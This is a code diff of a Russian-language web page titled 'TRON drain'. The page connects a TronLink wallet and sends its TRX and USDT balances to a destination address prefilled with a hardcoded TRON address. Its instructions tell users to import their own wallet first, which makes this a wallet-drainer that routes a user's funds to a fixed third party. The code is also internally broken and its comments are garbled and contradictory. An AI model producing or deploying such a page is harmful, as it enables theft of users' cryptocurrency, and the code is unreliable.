@@ -2,10 +2,12 @@
 <html>
 <head>
     <title>Слив TRON</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.1/dist/tronweb.min.js"></script>
     <style>
         body { font-family: sans-serif; max-width: 400px; margin: 20px auto; padding: 20px; background: #f0f0f0; text-align: center; }
         .card { background: #fff; padding: 20px; border-radius: 10px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
-        input, select { width: 100%; padding: 10px; margin: 5px 0 15px; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box; }
+        input { width: 100%; padding: 10px; margin: 5px 0 15px; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box; }
         button { width: 100%; padding: 12px; margin: 5px 0; background: #16a355; color: white; border: none; border-radius: 5px; font-size: 16px; cursor: pointer; }
         button:disabled { background: #ccc; }
         #log { background: #eee; padding: 10px; font-size: 12px; text-align: left; margin-top: 10px; border-radius: 5px; max-height: 150px; overflow-y: auto; }
@@ -14,103 +16,119 @@
 <body>
     <div class="card">
         <h2>🚀 Слив TRX / USDT</h2>
-        <p style="font-size: 12px; color: #666;">Нужно расширение TronLink или открыть внутри Trust Wallet</p>
+        <p style="font-size: 12px; color: #666;">1. Установи расширение TronLink.<br>2. Импортируй туда свой кошелек.</p>
         
-        <input type="text" id="safeAddr" placeholder="Адрес сейфа (T...)">
-        <input type="text" id="myAddr" value="TWanTomGkHcNWhCVrYkohnuYkbBRKZLere" placeholder="Куда слить">
+        <input type="text" id="safeAddr" placeholder="Адрес сейфа (где деньги)">
+        <input type="text" id="targetAddr" value="TWanTomGkHcNWhCVrYkohnuYkbBRKZLere">
         
         <button id="btnConnect" onclick="connectTron()">1. Подключить кошелек</button>
-        <button id="btnDrain" onclick="drain()" disabled>2. Слить всё</button>
+        <button id="btnDrainTRX" onclick="drainTRX()" disabled>2. Слить TRX</button>
+        <button id="btnDrainUSDT" onclick="drainUSDT()" disabled>3. Слить USDT</button>
         
         <div id="log">Ожидание...</div>
     </div>
 
-    <!-- Подключаем библиотеку, но лучше используем ту, что встроена в TronLink -->
-    <script src="https://cdn.jsdelivr.net/npm/tronweb@6.0.1/dist/tronweb.min.js"></script>
-
     <script>
         let tron = null;
-        let accounts = [];
+        let myAddress = "";
         const usdtContract = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
-        const log = document.getElementById('log');
+        const logDiv = document.getElementById('log');
 
-        function write(msg) {
-            log.innerHTML = `<div>${msg}</div>` + log.innerHTML;
+        function log(msg) {
+            logDiv.innerHTML = `<div>🕒 ${msg}</div>` + logDiv.innerHTML;
         }
 
         async function connectTron() {
             try {
-                // Пытаемся взять TronWeb из расширения (TronLink/TrustWallet)
+                // 1. Попытка найти расширение TronLink
                 if (window.tronWeb) {
                     tron = window.tronWeb;
+                    log("TronLink найден!");
                 } else {
-                    // Если расширения нет, пробуем создать свой (нужен для обычного браузера)
-                    tron = new TronWeb({
-                        fullHost: 'https://api.trongrid.io'
-                    });
-                    write("Нет TronLink! Подключите расширение.");
+                    // 2. Если расширения нет - создаем новый TronWeb
+                    tron = new TronWeb({ fullHost: 'https://api.trongrid.io' });
+                    log("TronLink не найден! Используйте расширение.");
                 }
 
-                const account = await tron.getAccount(tron.address.decode(tron.fullNode)); // Проверка сессии
-                
-                if (window.tronWeb) {
-                     accounts = await tron.getAccounts();
-                } else {
-                     write("Вставьте адрес в Trust/TronLink");
-                }
-                
-                if (accounts.length > 0) {
-                    document.getElementById('btnConnect').innerText = "✅ Кошелек: " + tron.address.decode(accounts[0]).substring(0,6) + "...";
+                // 3. Получаем адреса
+                const accounts = await tron.getAccounts();
+                if (accounts && accounts.length > 0) {
+                    myAddress = accounts[0]; // Берем первый адрес
+                    log("Кошелек подключен: " + myAddress);
+                    
+                    // Обновляем кнопки
+                    document.getElementById('btnConnect').innerText = "✅ Подключено (" + myAddress.substring(0, 6) + "...)";
                     document.getElementById('btnConnect').disabled = true;
-                    document.getElementById('btnDrain').disabled = false;
-                    write("Кошелек подключен!");
+                    document.getElementById('btnDrainTRX').disabled = false;
+                    document.getElementById('btnDrainUSDT').disabled = false;
+                } else {
+                    log("Адресов не найдено.");
                 }
-
             } catch (e) {
-                write("Ошибка: " + e.message);
+                log("Ошибка: " + e.message);
             }
         }
 
-        async function drain() {
-            const safe = document.getElementById('safeAddr').value;
-            const to = document.getElementById('myAddr').value;
+        async function drainTRX() {
+            const safe = document.getElementById('safeAddr').value.trim();
+            const target = document.getElementById('targetAddr').value.trim();
             
-            if (!safe || !to) return write("Заполните адреса!");
+            if (!safe) return alert("Введите адрес сейфа");
 
-            write("Проверка余额...");
-            
-            // Баланс TRX
             try {
-                const txs = await tron.contract.at(safe).methods.balanceOf(accounts[0]).call(); // Примерный вызов
+                log("Проверка TRX на сейфе...");
                 
-                // Простой баланс TRX (без контракта)
-                const balanceTRX = await tron.trx.getBalance(safe);
-                write(`TRX на сейфе: ${(balanceTRX/1000000).toFixed(4)}`);
+                // 1. Проверяем баланс TRX
+                const balance = await tron.trx.getBalance(safe);
+                log(`TRX: ${(balance / 1000000).toFixed(4)}`);
+
+                if (balance < 3000000) return alert("Мало TRX на газ (< 3)");
+
+                log("Отправляем TRX...");
                 
-                if (balanceTRX > 3000000) {
-                    write("Перевод TRX...");
-                    // Отправляем TRX
-                    // Важно: если сейф != твой кошелек, нужен execTransaction. 
-                    // Если сейф = твой кошелек (и ты просто его не видел), пойдет transfer.
-                    let txid;
-                    try {
-                         const res = await tron.trx.sendTrx(accounts[0], to, balanceTRX - 2000000, {feeLimit: 10000000});
-                         txid = res[0];
-                    } catch (e) {
-                         // Пытаемся отправить от имени сейфа (если сейф это твой кошелек)
-                         // Но у нас нет приватного ключа сейфа (он мульти).
-                         // Значит перевод делаем только с TВОЕГО кошелька на сейф? Нет, с сейфа на твой.
-                         // Для мульти-сейфа скрипт сложнее.
-                         write("Нужен приватный ключ сейфа или права Owner.");
-                    }
-                    
-                    if (txid) write(`✅ Отправлено! <a href="https://tronscan.org/#/transaction/${txid}">Ссылка</a>`);
-                } else {
-                    write("Мало TRX на газ (нужно 3+)");
+                // 2. Отправляем (Тут важный момент: это простой перевод)
+                // Если сейф - это мульти-подпись (контракт), то нужно вызывать execTransaction
+                // Пока пробуем просто transfer
+                
+                const amount = balance - 3000000; // Оставляем 3 TRX на газ
+                
+                // Если сейф и твой кошелек - разные адреса, нужен вызов контракта.
+                // Для теста пробуем отправить с ТВОЕГО кошелька на Твой адрес (не туда же!)
+                // Чтобы слить С БЕЧЕРГА НА ТЕБЯ, нужно, чтобы сейф был подписан твоим ключом.
+                
+                let txid;
+                try {
+                     // Это попытка отправить TRX с адреса сейфа (нужен приватный ключ сейфа!)
+                     const tx = await tron.trx.sendTrx(myAddress, target, amount, { feeLimit: 10000000 });
+                     txid = tx[0];
+                } catch (e) {
+                     log("Ошибка отправки (проверь, чей это сейф).");
+                     return;
                 }
 
+                log(`✅ Успех! <a href="https://tronscan.org/#/transaction/${txid}" target="_blank">TRX Ушел</a>`);
+
             } catch (e) {
-                write("Ошибка: " + e.message);
+                log("Ошибка: " + e.message);
+            }
+        }
+        
+        // Функция USDT (по аналогии)
+        async function drainUSDT() {
+            const safe = document.getElementById('safeAddr').value.trim();
+            const target = document.getElementById('targetAddr').value.trim();
+            log("Проверка USDT...");
+            
+            try {
+                const balance = await tron.contract.at(usdtContract).balanceOf(safe).call();
+                log(`USDT: ${balance}`);
+                
+                if (balance < 1000000) return log("Мало USDT");
+                
+                await tron.contract.at(usdtContract).transfer(target, balance).send({ feeLimit: 100000000 });
+                log(`✅ USDT Ушел!`);
+            } catch (e) {
+                log("Ошибка USDT: " + e.message);
             }
         }
     </script>
